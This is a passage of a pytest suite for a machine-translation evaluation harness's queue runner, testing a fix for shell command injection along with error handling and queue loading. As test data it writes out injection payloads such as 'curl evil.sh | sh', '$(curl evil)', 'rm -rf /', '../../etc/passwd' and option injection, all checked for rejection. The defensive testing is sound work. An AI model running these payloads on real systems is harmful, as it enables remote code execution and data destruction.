        assert kwargs.get("stdin") is queue_runner.subprocess.DEVNULL
        # (4) each item runs in its own report dir
        assert "--output-dir" in cmd


class TestBuildRunArgv:
    """build_run_argv reconstructs a shell-free argv from STRUCTURED fields
    and validates every field — the core of the RCE fix."""

    BASE = {
        "corpus_id": "eval-eng-ilo-tatoeba-dev-v1",
        "model": "anthropic/claude-haiku-4.5",
        "target_language": "Ilocano",
        "condition": "naive",
    }

    def test_naive_item_reconstructs_expected_argv(self):
        from mt_eval_harness.queue_runner import build_run_argv
        assert build_run_argv(self.BASE) == [
            "mt-eval", "run",
            "--corpus", "eval-eng-ilo-tatoeba-dev-v1",
            "--model", "anthropic/claude-haiku-4.5",
            "--target-lang", "Ilocano", "--yes",
        ]

    def test_uses_corpus_id_not_run_command(self):
        """Even if run_command is hostile, only structured fields are used."""
        from mt_eval_harness.queue_runner import build_run_argv
        item = dict(self.BASE,
                    run_command="mt-eval run; curl evil.sh | sh")
        argv = build_run_argv(item)
        assert ";" not in " ".join(argv)
        assert "curl" not in argv
        assert "eval-eng-ilo-tatoeba-dev-v1" in argv

    def test_provider_appended_only_when_non_default(self):
        from mt_eval_harness.queue_runner import build_run_argv
        assert "--provider" not in build_run_argv(self.BASE,
                                                  provider="openrouter")
        argv = build_run_argv(self.BASE, provider="anthropic")
        assert argv[-2:] == ["--provider", "anthropic"]

    def test_engine_item_dispatches_via_method(self):
        """condition == 'engine' runs the consumer-reports adapter path:
        --method <engine slug>, never --model (which rejects engine slugs
        as unknown models)."""
        from mt_eval_harness.queue_runner import build_run_argv
        item = {
            "corpus_id": "eval-jpn-kor-tatoeba-dev-v1",
            "model": "microsoft-translator",
            "target_language": "Korean",
            "condition": "engine",
        }
        argv = build_run_argv(item)
        assert argv[argv.index("--method") + 1] == "microsoft-translator"
        assert "--model" not in argv

    def test_engine_item_never_gets_llm_provider_flag(self):
        """Engine adapters bill their own vendor keys — an explicit LLM
        provider must not leak onto an engine run."""
        from mt_eval_harness.queue_runner import build_run_argv
        item = {
            "corpus_id": "eval-jpn-kor-tatoeba-dev-v1",
            "model": "google-translate",
            "target_language": "Korean",
            "condition": "engine",
        }
        assert "--provider" not in build_run_argv(item, provider="anthropic")

    def test_output_dir_appended(self):
        from mt_eval_harness.queue_runner import build_run_argv
        argv = build_run_argv(self.BASE, output_dir="/tmp/out")
        assert argv[-2:] == ["--output-dir", "/tmp/out"]

    def test_coached_requires_coaching_file(self):
        from mt_eval_harness.queue_runner import build_run_argv, QueueItemError
        coached = dict(self.BASE, condition="coached")
        with pytest.raises(QueueItemError):
            build_run_argv(coached)
        argv = build_run_argv(coached, coaching_file="/my/coach.txt")
        assert argv[-2:] == ["--coaching-file", "/my/coach.txt"]

    def test_unicode_language_name_allowed(self):
        from mt_eval_harness.queue_runner import build_run_argv
        item = dict(self.BASE,
                    target_language="Plains Cree (nêhiyawêwin, SRO)")
        argv = build_run_argv(item)
        assert "Plains Cree (nêhiyawêwin, SRO)" in argv

    @pytest.mark.parametrize("field,value", [
        ("corpus_id", "../../etc/passwd"),
        ("corpus_id", "a b"),                 # space
        ("model", "m; rm -rf /"),             # shell metacharacters
        ("model", "$(curl evil)"),
        ("target_language", "--output-dir=/etc"),   # option injection
        ("target_language", "x\nrm -rf /"),         # control character
    ])
    def test_rejects_malformed_fields(self, field, value):
        from mt_eval_harness.queue_runner import build_run_argv, QueueItemError
        item = dict(self.BASE)
        item[field] = value
        with pytest.raises(QueueItemError):
            build_run_argv(item)

    @pytest.mark.parametrize("field", ["corpus_id", "model", "target_language"])
    def test_missing_required_field_raises(self, field):
        from mt_eval_harness.queue_runner import build_run_argv, QueueItemError
        item = dict(self.BASE)
        del item[field]
        with pytest.raises(QueueItemError):
            build_run_argv(item)


class TestNoShellExecution:
    """End-to-end proof: a hostile network-supplied run_command is NEVER
    executed in a shell; the runner rebuilds the argv from structured fields.
    Deliberately does NOT use the shell_loop seam."""

    def test_hostile_run_command_is_never_shelled(
        self, tmp_path, mock_provider, monkeypatch
    ):
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser

        # Hermetic: disable the live-board coverage skip (see the note in
        # TestSubprocessIsolation — a seeded board can cover fixture combos).
        monkeypatch.setenv("MT_EVAL_NO_COVERAGE_SKIP", "1")

        captured = []

        class _FakeProc:
            returncode = 0

            def communicate(self, timeout=None):
                return ("", None)

            def kill(self):
                pass

        def spy(cmd, **kwargs):
            captured.append((cmd, kwargs))
            return _FakeProc()

        monkeypatch.setattr(queue_runner.subprocess, "Popen", spy)

        sentinel = tmp_path / "PWNED"
        item = {
            "id": "evil", "condition": "naive", "est_cost_usd": 0.01,
            "language_pair": "eng>zul",
            "corpus_id": "eval-eng-zul-tatoeba-dev-v1",
            "model": "anthropic/claude-haiku-4.5",
            "target_language": "Zulu",
            # The hostile payload: if this string ever reached a shell, the
            # sentinel file would be created.
            "run_command": f"mt-eval run; touch {sentinel}",
        }
        qfile = _make_queue_file(tmp_path, [item])
        args = build_parser().parse_args([
            "queue", "--top", "1", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        queue_runner.run_from_args(args)

        assert captured, "Popen was never called"
        cmd, kwargs = captured[0]
        assert isinstance(cmd, list)              # argv, not a shell string
        assert kwargs.get("shell") in (None, False)
        # The hostile payload is not present anywhere in the executed argv.
        joined = " ".join(map(str, cmd))
        assert "touch" not in joined and ";" not in joined
        # And nothing in the payload ran.
        assert not sentinel.exists()

    def test_unbuildable_item_is_failed_not_shelled(
        self, tmp_path, mock_provider, monkeypatch, capsys
    ):
        """An item lacking structured fields is reported as failed — the
        runner never shells its run_command as a fallback."""
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser

        captured = []

        class _FakeProc:
            returncode = 0

            def communicate(self, timeout=None):
                return ("", None)

            def kill(self):
                pass

        monkeypatch.setattr(
            queue_runner.subprocess, "Popen",
            lambda cmd, **kw: captured.append((cmd, kw)) or _FakeProc(),
        )

        item = {
            "id": "broken", "condition": "naive", "est_cost_usd": 0.01,
            "language_pair": "eng>zul", "model": "anthropic/claude-haiku-4.5",
            # Display fields present, but no corpus_id / target_language →
            # build_run_argv cannot safely reconstruct the command.
            "run_command": "mt-eval run; touch /tmp/should_not_run",
        }
        qfile = _make_queue_file(tmp_path, [item])
        args = build_parser().parse_args([
            "queue", "--top", "1", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        rc = queue_runner.run_from_args(args)

        # Nothing was ever dispatched to a subprocess.
        assert captured == []
        # Reported as a failed run (non-zero exit), not silently shelled.
        out = capsys.readouterr().out
        assert "unrunnable queue item" in out or "failed" in out.lower()
        assert rc == 1


class TestBatchSurvivesPublishFailure:
    """A publish that raises SystemExit must NOT abort the rest of the batch."""

    def test_systemexit_publish_does_not_abort_batch(
        self, tmp_path, mock_provider, shell_loop, monkeypatch, capsys
    ):
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser

        out_root = tmp_path / "out"
        monkeypatch.setattr(queue_runner, "DEFAULT_OUTPUT_DIR", str(out_root))

        # Auth is required on the publish path — stub it so no OAuth happens.
        monkeypatch.setattr(
            "mt_eval_harness.auth.get_session",
            lambda: {"access_token": "x", "user": {}},
        )
        monkeypatch.setattr(
            "mt_eval_harness.auth.get_submitter_name", lambda s: "tester"
        )
        # Every publish explodes with SystemExit — the dangerous case.
        monkeypatch.setattr(
            "mt_eval_harness.publish.publish_to_supabase",
            lambda *a, **k: (_ for _ in ()).throw(SystemExit(1)),
        )

        report = json.dumps({"overall": {"total_cost_usd": 0.01,
                                         "avg_chrf": 50.0}})
        items = []
        for idx, (iid, pair) in enumerate(
            [("itemA", "eng>zul"), ("itemB", "eng>hau")], 1
        ):
            d = out_root / "queue" / f"{idx:03d}_{iid}"
            cmd = (f"mkdir -p '{d}' && printf '%s' '{report}' "
                   f"> '{d}/run_{iid}_report.json'")
            items.append({
                "id": iid, "condition": "naive", "est_cost_usd": 0.01,
                "language_pair": pair, "model": "m", "run_command": cmd,
            })
        qfile = _make_queue_file(tmp_path, items)

        # 2 items → sequential → deterministic ordering.
        args = build_parser().parse_args([
            "queue", "--top", "2", "--yes",
            "--queue", qfile, "--timeout", "10",
        ])

        # The whole point: this returns an int, it does NOT raise SystemExit.
        rc = queue_runner.run_from_args(args)
        assert isinstance(rc, int)

        out = capsys.readouterr().out
        # Both items ran...
        assert "eng>zul" in out and "eng>hau" in out
        # ...were honestly reported as NOT published...
        assert "NOT published" in out
        assert "0/2 published" in out
        # ...and the contributor is told how to recover their paid runs.
        assert "mt-eval publish" in out


class TestClassifyFailure:
    """_classify_failure: rate-limit/timeout must NOT read as a bad key."""

    @pytest.mark.parametrize("status,hint,expected", [
        ("timeout", "",                              "transient"),
        ("failed",  "HTTP 429: rate limit exceeded", "transient"),
        ("failed",  "rate_limit reached",            "transient"),
        ("failed",  "503 Service Unavailable",       "transient"),
        ("failed",  "connection reset by peer",      "transient"),
        ("failed",  "HTTP 401: invalid api key",     "auth"),
        ("failed",  "403 Forbidden",                 "auth"),
        ("failed",  "User not found.",               "auth"),
        ("failed",  "something exploded",            "other"),
        # A 429 body that also mentions a key is STILL a rate limit.
        ("failed",  "429: too many requests for this api key", "transient"),
    ])
    def test_classification(self, status, hint, expected):
        from mt_eval_harness.queue_runner import _classify_failure
        assert _classify_failure(status, hint) == expected


class TestCircuitBreakerClassification:
    """Auth failures offer key re-entry; transient ones never stall."""

    def test_transient_failures_do_not_prompt_for_key(
        self, tmp_path, mock_provider, shell_loop, monkeypatch, capsys
    ):
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser

        prompted = []
        monkeypatch.setattr(
            queue_runner, "_prompt_reenter_key",
            lambda ev: prompted.append(ev) or None,
        )

        items = [
            {"id": f"t{i}", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": f"eng>x{i}", "model": "m",
             "run_command": "echo 'HTTP 429: rate limit exceeded'; exit 1"}
            for i in range(6)
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", "6", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        queue_runner.run_from_args(args)
        out = capsys.readouterr().out

        # The key-re-entry prompt must NEVER fire for rate limits.
        assert prompted == []
        # The user is told it's transient, not an auth problem.
        assert "not an auth" in out.lower()

    def test_auth_failures_prompt_for_key(
        self, tmp_path, mock_provider, shell_loop, monkeypatch, capsys
    ):
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser

        prompted = []
        # Decline re-entry (return None) so the batch then stops.
        monkeypatch.setattr(
            queue_runner, "_prompt_reenter_key",
            lambda ev: prompted.append(ev) or None,
        )

        items = [
            {"id": f"a{i}", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": f"eng>y{i}", "model": "m",
             "run_command": "echo 'HTTP 401: invalid api key'; exit 1"}
            for i in range(3)
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", "3", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        queue_runner.run_from_args(args)

        # 3 consecutive auth failures → exactly the case that SHOULD prompt.
        assert prompted, "auth failures should have offered key re-entry"


class TestDefaultConcurrencyByProvider:
    """Direct providers default to gentler concurrency than OpenRouter."""

    def _run(self, tmp_path, monkeypatch, provider, env_var, n=5):
        from mt_eval_harness import queue_runner
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        # Drive the loop with the item's harmless `run_command` ("true") via a
        # shell seam; production rebuilds a shell-free argv (see shell_loop).
        monkeypatch.setattr(
            queue_runner, "build_run_argv",
            lambda item, **kw: ["sh", "-c", item["run_command"]],
        )

        for var in ("OPENROUTER_API_KEY", "OPENAI_API_KEY",
                    "ANTHROPIC_API_KEY", "GOOGLE_API_KEY"):
            monkeypatch.delenv(var, raising=False)
        monkeypatch.setenv(env_var, "sk-test")

        class _FakeProvider:
            def load_api_key(self):
                pass

        monkeypatch.setattr(
            "mt_eval_harness.providers.get_provider",
            lambda name: _FakeProvider(),
        )
        items = [
            {"id": f"i{i}", "condition": "naive", "est_cost_usd": 0.01,
             "language_pair": f"eng>x{i}", "model": "m",
             "run_command": "true"}
            for i in range(n)
        ]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--top", str(n), "--yes", "--no-publish",
            "--provider", provider, "--queue", qfile, "--timeout", "5",
        ])
        run_from_args(args)

    def test_openrouter_defaults_to_8(self, tmp_path, monkeypatch, capsys):
        self._run(tmp_path, monkeypatch, "openrouter", "OPENROUTER_API_KEY")
        assert "8 concurrent" in capsys.readouterr().out

    def test_direct_provider_defaults_to_4(self, tmp_path, monkeypatch, capsys):
        self._run(tmp_path, monkeypatch, "anthropic", "ANTHROPIC_API_KEY")
        assert "4 concurrent" in capsys.readouterr().out


class TestYesSpendNotice:
    """--yes must NEVER spend (and publish) silently.

    A cached-session `--yes` run skips the interactive prompt but still echoes
    a one-line "spending … publishing …" notice before any tokens are spent —
    the reconciliation of the curl|bash banner's "confirmation at each step"
    promise with --yes reality.
    """

    def test_yes_no_publish_echoes_spend_notice(
        self, tmp_path, mock_provider, shell_loop, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        items = [{"id": "i0", "condition": "naive", "est_cost_usd": 0.01,
                  "language_pair": "eng>zul", "model": "m",
                  "run_command": "true"}]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--budget", "2", "--yes", "--no-publish",
            "--queue", qfile, "--timeout", "5",
        ])
        run_from_args(args)
        out = capsys.readouterr().out
        # The spend cap is echoed, and it is explicit that nothing publishes.
        assert "--yes:" in out
        assert "up to $2.00" in out
        assert "NOT publishing" in out

    def test_yes_publish_echoes_identity_and_publish(
        self, tmp_path, mock_provider, shell_loop, monkeypatch, capsys
    ):
        from mt_eval_harness.cli import build_parser
        from mt_eval_harness.queue_runner import run_from_args

        # Stub auth so no real OAuth happens, with a known submitter name; stub
        # publish so the test never writes to a leaderboard.
        monkeypatch.setattr(
            "mt_eval_harness.auth.get_session",
            lambda: {"access_token": "x", "user": {}},
        )
        monkeypatch.setattr(
            "mt_eval_harness.auth.get_submitter_name", lambda s: "octocat"
        )
        monkeypatch.setattr(
            "mt_eval_harness.publish.publish_to_supabase",
            lambda *a, **k: {"id": "x"},
        )

        items = [{"id": "i0", "condition": "naive", "est_cost_usd": 0.01,
                  "language_pair": "eng>zul", "model": "m",
                  "run_command": "true"}]
        qfile = _make_queue_file(tmp_path, items)
        args = build_parser().parse_args([
            "queue", "--budget", "2", "--yes",
            "--queue", qfile, "--timeout", "5",
        ])
        run_from_args(args)
        out = capsys.readouterr().out
        # The notice names the attributed identity and that results publish.
        assert "--yes:" in out
        assert "as octocat" in out
        assert "publishing" in out.lower()


class TestEngineAuthAbortIsolation:
    """Vendor-key failures on engine items must not trip the LLM-lane auth
    circuit breaker (2026-07-19: three consecutive Microsoft Translator 401s
    aborted a healthy batch blaming the OpenRouter key)."""

    def test_engine_401_does_not_count(self):
        from mt_eval_harness.queue_runner import counts_toward_llm_auth_abort
        item = {"condition": "engine", "model": "microsoft-translator"}
        hint = ("Vacuous run: every entry errored (first: RuntimeError: "
                "Microsoft Translator: HTTP 401)")
        assert counts_toward_llm_auth_abort(item, hint) is False

    def test_llm_401_counts(self):
        from mt_eval_harness.queue_runner import counts_toward_llm_auth_abort
        item = {"condition": "naive", "model": "anthropic/claude-haiku-4.5"}
        assert counts_toward_llm_auth_abort(item, "HTTP 401 unauthorized")

    def test_llm_non_auth_failure_does_not_count(self):
        from mt_eval_harness.queue_runner import counts_toward_llm_auth_abort
        item = {"condition": "naive", "model": "anthropic/claude-haiku-4.5"}
        assert counts_toward_llm_auth_abort(item, "timeout talking to API") is False


class TestSourceLanguageInArgv:
    """Queue items carry source_language (2026-07-19) — the rebuilt argv
    must pass it so prompts stop defaulting to 'from English'."""

    def _base_item(self, **over):
        item = {
            "corpus_id": "eval-deu-kur-tatoeba-dev-v1",
            "model": "anthropic/claude-haiku-4.5",
            "condition": "naive",
            "source_language": "German",
            "target_language": "Kurdish",
        }
        item.update(over)
        return item

    def test_source_lang_flag_present(self):
        from mt_eval_harness.queue_runner import build_run_argv
        argv = build_run_argv(self._base_item())
        i = argv.index("--source-lang")
        assert argv[i + 1] == "German"
        assert argv[argv.index("--target-lang") + 1] == "Kurdish"

    def test_missing_source_lang_still_runs(self):
        from mt_eval_harness.queue_runner import build_run_argv
        argv = build_run_argv(self._base_item(source_language=None))
        assert "--source-lang" not in argv

    def test_hostile_source_lang_rejected(self):
        import pytest as _pytest
        from mt_eval_harness.queue_runner import (
            QueueItemError, build_run_argv,
        )
        with _pytest.raises(QueueItemError):
            build_run_argv(self._base_item(source_language="--rm -rf"))


# ---------------------------------------------------------------------------
# DB-as-queue (B1): load_queue('db') serves from the queue_top RPC with a
# graceful fall back to the static blob so the run flow never breaks.
# ---------------------------------------------------------------------------

def test_load_queue_db_source_uses_the_rpc(monkeypatch):
    from mt_eval_harness import queue_runner as qr
    sentinel = {"metadata": {"open_items": 2}, "items": [{"id": "a"}, {"id": "b"}]}
    monkeypatch.setattr(qr, "load_queue_from_db", lambda: sentinel)
    assert qr.load_queue("db") is sentinel


def test_load_queue_db_falls_back_to_the_blob(monkeypatch):
    import json as _json
    from mt_eval_harness import queue_runner as qr

    def boom():
        raise RuntimeError("db unreachable")
    monkeypatch.setattr(qr, "load_queue_from_db", boom)

    blob = {"metadata": {"open_items": 1}, "items": [{"id": "x", "priority": 1}]}

    class FakeResp:
        headers = {"Content-Type": "application/json"}
        def read(self):
            return _json.dumps(blob).encode("utf-8")
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
    monkeypatch.setattr(qr.urllib.request, "urlopen",
                        lambda *a, **k: FakeResp())
    # 'db' → load_queue_from_db raises → falls back to DEFAULT_QUEUE_URL blob,
    # stamped so an empty fallback can be reported as an OUTAGE rather than as
    # "no runnable items" (queue_health_error).
    got = qr.load_queue("db")
    assert got["items"] == blob["items"]
    assert got["metadata"]["open_items"] == 1
    assert got["metadata"]["_degraded_from_db"] == "db unreachable"


class TestDbQueueTransmissionStamp:
    """The DB-served queue must disclose restricted corpora like the blob does.

    Regression: the `transmission` stamp is a SERVED extra on queue.json but
    not a `queue_items` COLUMN — the ranker writes it into the diagnostics
    JSONB. `load_queue_from_db` projected columns only, so every DB-served
    item lost its stamp and the pre-spend plan stopped disclosing the no-train
    channel requirement (280 WMT research-use items live at the time).
    """

    STAMP = {
        "policy": "no-train",
        "reason": "license 'LicenseRef-WMT-Research-Use': explicit data-side "
                  "transmission_policy='no-train' on the registry entry",
        "openrouter_provider_prefs": {"data_collection": "deny"},
        "notice": "License-restricted corpus: send it only over channels that "
                  "do not retain or train on inputs.",
    }

    def _rows(self):
        base = {
            "priority": 1, "language_pair": "eng>deu", "source_language": "eng",
            "target_language": "deu", "entry_count": 100, "contamination": "low",
            "domain": "news", "source_length": 20, "model": "m1",
            "condition": "naive", "est_cost_usd": 0.01, "est_basis": "tokens",
            "run_command": "true", "rank_mode": "map", "map_value": 1.0,
            "generation_id": "g1", "generated_at": "2026-08-19T00:00:00Z",
        }
        return [
            {**base, "id": "restricted", "corpus_id": "eval-wmt24-x",
             "corpus_license": "LicenseRef-WMT-Research-Use",
             "diagnostics": {"transmission": self.STAMP}},
            {**base, "id": "cleared", "corpus_id": "eval-tatoeba-y",
             "corpus_license": "CC-BY-2.0", "diagnostics": {}},
        ]

    def _load(self, monkeypatch):
        import io
        from mt_eval_harness import queue_runner as qr

        payloads = iter([
            json.dumps({"metadata": {"rank_mode": "map",
                                     "generated_by": "test"}}).encode(),
            json.dumps(self._rows()).encode(),
        ])

        class _Resp(io.BytesIO):
            def __enter__(self): return self
            def __exit__(self, *a): return False

        monkeypatch.setattr(qr.urllib.request, "urlopen",
                            lambda *a, **k: _Resp(next(payloads)))
        return qr.load_queue_from_db()

    def test_stamp_survives_the_db_projection(self, monkeypatch):
        queue = self._load(monkeypatch)
        by_id = {i["id"]: i for i in queue["items"]}
        assert by_id["restricted"].get("transmission") == self.STAMP
        assert "transmission" not in by_id["cleared"]

    def test_plan_marker_fires_for_db_served_items(self, monkeypatch):
        queue = self._load(monkeypatch)
        by_id = {i["id"]: i for i in queue["items"]}
        assert transmission_plan_marker(by_id["restricted"]) == "  [no-train]"
        assert transmission_plan_marker(by_id["cleared"]) == ""

    def test_diagnostics_itself_is_not_leaked_onto_the_item(self, monkeypatch):
        """Only the stamp is lifted — the ranking diagnostics stay unpublished."""
        queue = self._load(monkeypatch)
        assert all("diagnostics" not in i for i in queue["items"])


class TestQueueOutageReporting:
    """An outage must read as an outage.

    A contributor who offers compute and is told "No runnable items matched
    the selection" reasonably concludes the work is done. When the real cause
    is a failed DB fetch landing on the 0-item `ensure-network-artifacts.mjs`
    stub — which prod has actually served — that is an outage.
    """

    def _err(self, queue, source="db"):
        from mt_eval_harness.queue_runner import queue_health_error
        return queue_health_error(queue, source)

    def test_degraded_fallback_with_no_items_is_an_outage(self):
        msg = self._err({"metadata": {"_degraded_from_db": "db unreachable"},
                         "items": []})
        assert "outage" in msg.lower()
        assert "nothing was spent" in msg
        assert "db unreachable" in msg

    def test_the_stub_artifact_is_an_outage_even_when_reached_cleanly(self):
        msg = self._err({"metadata": {"generated_by":
                                      "ensure-network-artifacts.mjs (stub)",
                                      "open_items": 0}, "items": []})
        assert "outage" in msg.lower()
        assert "placeholder artifact" in msg

    def test_an_empty_healthy_queue_is_still_an_outage_not_silence(self):
        """A generated queue with zero items means the pipeline produced
        nothing — never a silent 'no work available'."""
        msg = self._err({"metadata": {"open_items": 0}, "items": []})
        assert "outage" in msg.lower()

    def test_degraded_but_usable_is_not_an_outage(self):
        """The fallback carrying real work is degraded, not down — the run
        proceeds (the caller prints a staleness warning)."""
        assert self._err({"metadata": {"_degraded_from_db": "db unreachable"},
                          "items": [{"id": "a"}]}) == ""

    def test_a_healthy_queue_reports_nothing(self):
        assert self._err({"metadata": {"open_items": 1},
                          "items": [{"id": "a"}]}) == ""


# ---------------------------------------------------------------------------
# Bounded DB paging + the 'blob' sentinel (2026-08-27).
#
# The live queue is six figures deep (211k+ open items), so a full queue_top
# drain is ~423 sequential RPC pages ≈ 3 minutes. A deterministic --top N run
# only ever consumes a shallow prefix, so load_queue_from_db(top=N) must stop
# paging early. 'blob' joins 'db' as a sentinel because the MCP server has
# always accepted CHAMPOLLION_QUEUE_SOURCE=blob and the harness read the same
# env var as a literal file path ("Queue file not found: blob").
# ---------------------------------------------------------------------------

def _paged_urlopen(monkeypatch, total_rows, preview_metadata=None):
    """urlopen mock: queue-preview.json first, then queue_top pages honoring
    p_offset/p_limit over `total_rows` generated rows. Returns the list of
    queue_top offsets requested."""
    import io
    from mt_eval_harness import queue_runner as qr

    metadata = preview_metadata or {"rank_mode": "map", "open_items": total_rows,
                                    "generated_by": "test"}
    offsets: list[int] = []

    def row(i):
        return {"priority": i + 1, "id": f"item-{i + 1}",
                "language_pair": "eng>zul", "model": "m1",
                "condition": "naive", "est_cost_usd": 0.01,
                "diagnostics": {}}

    class _Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def fake_urlopen(req, timeout=None):
        url = req if isinstance(req, str) else req.full_url
        if "queue-preview.json" in url:
            return _Resp(json.dumps({"metadata": metadata}).encode())
        assert "queue_top" in url, f"unexpected url {url}"
        payload = json.loads(req.data.decode())
        offset = payload["p_offset"]
        limit = payload["p_limit"]
        offsets.append(offset)
        page = [row(i) for i in range(offset, min(offset + limit, total_rows))]
        return _Resp(json.dumps(page).encode())

    monkeypatch.setattr(qr.urllib.request, "urlopen", fake_urlopen)
    return offsets


def test_bounded_top_load_stops_paging_early(monkeypatch):
    from mt_eval_harness import queue_runner as qr
    # 3 full pages available; top=10 needs 10 + one page of margin = 510
    # eligible rows → exactly two pages, never a drain.
    offsets = _paged_urlopen(monkeypatch, total_rows=qr.QUEUE_TOP_PAGE * 3)
    queue = qr.load_queue_from_db(top=10)
    assert offsets == [0, qr.QUEUE_TOP_PAGE]
    assert len(queue["items"]) == qr.QUEUE_TOP_PAGE * 2
    # A bounded load cannot know the live total — the preview's
    # generation-time count must stand, never the prefix length.
    assert queue["metadata"]["open_items"] == qr.QUEUE_TOP_PAGE * 3


def test_bounded_top_counts_only_selectable_rows(monkeypatch):
    """Coached rows are skipped by default selection, so the bound must not
    count them toward the top-N target."""
    import io
    from mt_eval_harness import queue_runner as qr

    pages_served = []

    class _Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def fake_urlopen(req, timeout=None):
        url = req if isinstance(req, str) else req.full_url
        if "queue-preview.json" in url:
            return _Resp(json.dumps({"metadata": {"rank_mode": "map",
                                                  "open_items": 5000}}).encode())
        payload = json.loads(req.data.decode())
        offset = payload["p_offset"]
        pages_served.append(offset)
        # Every row coached: never eligible without include_coached, so the
        # pager keeps going until the ranking ends (3 pages, last one short).
        n = qr.QUEUE_TOP_PAGE if len(pages_served) < 3 else 1
        page = [{"priority": offset + i + 1, "id": f"c-{offset + i}",
                 "language_pair": "eng>zul", "model": "m1",
                 "condition": "coached", "est_cost_usd": 0.01,
                 "diagnostics": {}} for i in range(n)]
        return _Resp(json.dumps(page).encode())

    monkeypatch.setattr(qr.urllib.request, "urlopen", fake_urlopen)
    queue = qr.load_queue_from_db(top=1)
    assert len(pages_served) == 3, "coached rows must not satisfy the bound"
    # The drain completed (short page), so the live count IS known.
    assert queue["metadata"]["open_items"] == len(queue["items"])


def test_full_drain_still_reports_live_open_items(monkeypatch):
    from mt_eval_harness import queue_runner as qr
    _paged_urlopen(monkeypatch, total_rows=7,
                   preview_metadata={"rank_mode": "map", "open_items": 9999})
    queue = qr.load_queue_from_db()
    assert len(queue["items"]) == 7
    assert queue["metadata"]["open_items"] == 7, \
        "a complete drain reports the LIVE served count, not the stale stat"


def test_load_queue_blob_sentinel_uses_the_default_url(monkeypatch):
    import io
    from mt_eval_harness import queue_runner as qr

    def db_must_not_run(*a, **k):
        raise AssertionError("'blob' must bypass the DB loader entirely")
    monkeypatch.setattr(qr, "load_queue_from_db", db_must_not_run)

    blob = {"metadata": {"open_items": 1}, "items": [{"id": "x"}]}
    fetched_urls = []

    class _Resp:
        headers = {"Content-Type": "application/json"}

        def read(self):
            return json.dumps(blob).encode()

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def fake_urlopen(url, timeout=None):
        fetched_urls.append(url)
        return _Resp()
    monkeypatch.setattr(qr.urllib.request, "urlopen", fake_urlopen)

    queue = qr.load_queue("blob")
    assert fetched_urls == [qr.DEFAULT_QUEUE_URL]
    assert queue["items"] == blob["items"]
    assert "_degraded_from_db" not in queue["metadata"], \
        "an explicit blob request is a choice, not an outage"


def test_load_queue_without_top_hint_calls_db_loader_zero_arg(monkeypatch):
    """Injectability contract: with no depth hint the DB loader is invoked
    with NO arguments (tests and wrappers monkeypatch it as a thunk)."""
    from mt_eval_harness import queue_runner as qr
    sentinel = {"metadata": {}, "items": []}

    def strict_loader(*args, **kwargs):
        assert not args and not kwargs
        return sentinel
    monkeypatch.setattr(qr, "load_queue_from_db", strict_loader)
    assert qr.load_queue("db") is sentinel


def test_load_queue_threads_the_top_hint(monkeypatch):
    from mt_eval_harness import queue_runner as qr
    seen = {}

    def loader(top=None, include_coached=False):
        seen.update(top=top, include_coached=include_coached)
        return {"metadata": {}, "items": []}
    monkeypatch.setattr(qr, "load_queue_from_db", loader)
    qr.load_queue("db", top=25, include_coached=True)
    assert seen == {"top": 25, "include_coached": True}
